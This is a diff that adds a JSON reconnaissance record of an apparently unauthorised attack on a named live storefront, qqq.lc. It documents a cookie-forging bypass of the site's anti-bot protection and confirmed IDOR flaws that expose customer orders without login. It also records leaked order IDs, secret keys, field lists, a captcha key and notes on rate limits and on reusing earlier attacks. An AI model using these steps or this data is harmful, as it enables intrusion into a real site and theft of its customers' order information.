@@ -1,0 +1,152 @@
+{
+  "target": "https://qqq.lc/",
+  "sitename": "qqq.lc",
+  "framework": "rainbow_faka",
+  "version": "2.8.3",
+  "build": "1043",
+  "cluster": {
+    "ips": ["cloudflare"],
+    "yxts": 257,
+    "cf_hosts": ["104.21.87.146", "172.67.169.230"],
+    "note": "Root-path rainbow (no /shop/). Behind Cloudflare + chenmYun CC (JSFuck ccsafe_defend). Not the 45.158/103.43 yxts=276 cluster."
+  },
+  "stats": {
+    "orders": 59420,
+    "orders_paid": 59378,
+    "orders2": 1723,
+    "money": 1245472.2,
+    "money1": 41518.29,
+    "site": 8619,
+    "tool": 2274,
+    "gift": null,
+    "cart_count": 0
+  },
+  "contacts": {},
+  "success_cases_migration": {
+    "source": "/data/recon/exports/SUCCESS_CASES.md",
+    "tested_upfront": true,
+    "results": {
+      "qd93_substring_query": "not_vulnerable_html_302_to_login; ajax_query_is_exact_input_match_IDOR_instead",
+      "79yj_api_search_idor": "api.php_and_%61pi.php_404; ajax_act_search_No_Act",
+      "qq1234_api_search_idor": "same_as_79yj",
+      "mima1314_ykfaka_null": "N/A_not_ykfaka",
+      "15118_ykfaka_null": "N/A_not_ykfaka"
+    },
+    "directly_reusable": [],
+    "new_finding": "unauth_ajax_query_input_enum_plus_skey_order_detail"
+  },
+  "cc_waf": {
+    "cloudflare": true,
+    "chenmYun_cc": true,
+    "bypass": "Eval JSFuck in setCookie('ccsafe_defend',EXPR); set cookies ccsafe_defend=<64hex> + ccsafe_defend_time=2; then / → 302 /user/login.php",
+    "rate_limit": "CF 1015/429 under heavy spray"
+  },
+  "unauth_surfaces": {
+    "api_php": 404,
+    "api_percent61_bypass": 404,
+    "shop_path": 404,
+    "getcount": true,
+    "ajax_query": true,
+    "ajax_order_with_skey": true,
+    "ajax_captcha_geetest": true,
+    "card_check": true,
+    "user_login": true,
+    "user_reg": true,
+    "pay_without_login": "code=4 你还未登录"
+  },
+  "geetest": {
+    "gt": "0ea798b5bed2f1e44363199aadfc2773",
+    "note": "Different from shared cluster gt=a1017fd4951689c5d20317c165c1c318"
+  },
+  "query_idor": {
+    "endpoint": "POST /ajax.php?act=query",
+    "auth": "none (CC cookie only)",
+    "params": "querytype=1&qq=<input>&page=N",
+    "match": "exact match on order.input (not TN substring)",
+    "proof": {
+      "qq": "1",
+      "total": 5539,
+      "sample_order_id": "20260803153417205366",
+      "sample_skey": "f492c148eb6db0fb8aece5bafc427edd",
+      "fields_leaked": ["id", "tid", "input", "name", "value", "money", "addtime", "endtime", "result", "status", "is_curl", "skey", "payorder", "shopimg"]
+    },
+    "digit_totals_sample": {
+      "1": 5539,
+      "2": 172,
+      "3": 170,
+      "4": 12,
+      "5": 43,
+      "6": 46,
+      "7": 24,
+      "8": 27,
+      "9": 135,
+      "11": 56,
+      "12": 36,
+      "qq": 35
+    },
+    "html_mod_query": "302 → /user/login.php (storefront gated)"
+  },
+  "order_detail_idor": {
+    "endpoint": "POST /ajax.php?act=order",
+    "auth": "id + skey from query list (no login)",
+    "bad_skey": "code=-2 验证失败",
+    "no_skey": "code=-1 验证失败",
+    "fields": ["payorder", "name", "money", "date", "inputs", "list", "list_result", "kminfo", "desc", "status", "result", "expressInfo", "complain", "works"],
+    "sms_payload_fields": {
+      "list": null,
+      "list_result": null,
+      "kminfo": null,
+      "result": null,
+      "note": "Sampled status 0/1/2/4 orders (incl. 30 pages of qq=1 + ~60s poll of live page1 + phoneish inputs) — SMS number/code fields stayed null. Likely ephemeral upstream dock data or login-gated delivery."
+    },
+    "product_type": "QQ注册 发码/接码 (SMS), not static kami cards"
+  },
+  "oracles": {
+    "card_check": {"empty_card": "version 2.8.3 build 1043"},
+    "user_ajax_login": "用户名或密码不正确！",
+    "pay": "你还未登录",
+    "card_act": "当前站点未开启卡密下单",
+    "ajax_unknown_act": "No Act + version/build"
+  },
+  "pay": {
+    "requires_login": true,
+    "hashsalt_storefront": "not reachable unauthenticated (root→login)",
+    "note": "Cannot exercise pay/USDT without account; reg/login need Geetest"
+  },
+  "login": {
+    "path": "/user/login.php",
+    "title": "用户登录-qqq.lc",
+    "captcha": "geetest captcha_type=1",
+    "reg": "/user/reg.php open (Geetest)",
+    "findpwd": "/user/findpwd.php"
+  },
+  "test_orders": [
+    {
+      "id": "20260803153417205366",
+      "input": "1",
+      "tid": 303,
+      "name": "通道10---发码---注册QQ【全网最低价】",
+      "money": "8.39",
+      "status": 1,
+      "skey": "f492c148eb6db0fb8aece5bafc427edd"
+    },
+    {
+      "id": "20260803152606727453",
+      "input": "1",
+      "name": "通道10---接码---①腾讯QQ[接码首次注册卡][85%成功]",
+      "money": "10.50",
+      "status_list": 2,
+      "detail_status_after": 4
+    }
+  ],
+  "critical_blockers": [
+    "HTML storefront gated: / and /?mod=* → 302 /user/login.php",
+    "api.php / %61pi.php removed (404)",
+    "Pay requires login + Geetest",
+    "SMS list/kminfo not present in unauth order detail samples",
+    "CF/chenmYun rate limits"
+  ],
+  "kami_obtained": false,
+  "kami_note": "No static kami; SMS payloads (list/kminfo) null in all unauth samples. Order metadata + skey IDOR confirmed.",
+  "timestamp_utc": "2026-08-03T07:50:00Z"
+}
